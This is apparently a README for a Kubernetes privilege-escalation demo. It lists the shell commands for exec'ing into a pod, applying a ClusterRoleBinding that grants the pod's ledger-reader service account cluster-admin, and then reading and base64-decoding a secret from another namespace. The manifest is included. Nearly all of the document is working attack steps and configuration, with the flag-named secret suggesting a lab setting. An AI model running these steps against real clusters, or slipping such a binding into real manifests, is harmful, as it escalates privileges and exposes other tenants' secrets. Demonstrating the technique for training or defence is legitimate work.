# Demo: Cluster-Admin Bind

Technique 3: bind to cluster-admin.

![Cluster-admin bind demo](gifs/03-cluster-admin-bind.gif)

## Commands run

```bash
kubectl exec -it -n wallet-svc pod-pivot -- sh

# inside the pod, as ledger-reader
kubectl auth can-i --list
exit

cat manifests/clusterrolebinding-pivot-admin.yaml
kubectl exec -i -n wallet-svc pod-pivot -- kubectl apply -f - < manifests/clusterrolebinding-pivot-admin.yaml
kubectl exec -it -n wallet-svc pod-pivot -- sh

# inside the pod, now cluster-admin
kubectl auth can-i '*' '*'
kubectl get secrets -n vault-prime
kubectl get secret demo-flag-3 -n vault-prime -o jsonpath='{.data.flag}' | base64 -d
exit
```

## manifests/clusterrolebinding-pivot-admin.yaml

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pivot-admin
subjects:
  - kind: ServiceAccount
    name: ledger-reader
    namespace: wallet-svc
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```
